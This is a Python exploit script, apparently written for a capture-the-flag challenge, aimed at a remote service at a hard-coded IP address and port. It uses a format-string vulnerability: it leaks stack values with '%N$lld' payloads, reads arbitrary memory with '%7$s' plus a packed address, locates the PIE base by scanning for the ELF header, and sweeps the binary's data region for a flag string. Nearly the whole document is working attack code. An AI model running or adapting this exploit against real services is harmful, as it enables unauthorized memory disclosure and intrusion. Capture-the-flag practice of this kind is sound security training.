#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.03)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    for _ in range(6):
        d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
        if m: return int(m.group(1))
        time.sleep(0.15)
    return None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    for _ in range(8):
        a15=leak_lld(s,15)
        if a15:
            start=a15&~0xfff
            for d in range(0,0x20000,0x1000):
                r=readmem(s,start-d)
                if r.startswith(b'\x7fELF'): return start-d
    return None

# scan binary data region for flag, reconnecting on crash
s=newconn(); pie=get_pie(s)
print("pie=",hex(pie))
found=[]
rel=0x3000
try:
    while rel < 0x9000:
        X=pie+rel
        r=readmem(s,X)
        if b'PTITCTF' in r or b'2026' in r or b'{' in r or b'flag' in r.lower():
            print("MARK",hex(X),repr(r[:250])); found.append(X)
        if r==b'' or r==b'<T':
            try: s.close()
            except: pass
            s=newconn(); pie=get_pie(s); rel=0x3000
        else:
            strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
            rel += max(len(strb),1)
except Exception as e:
    print("err",e)
print("found",[hex(x) for x in found])
s.close()
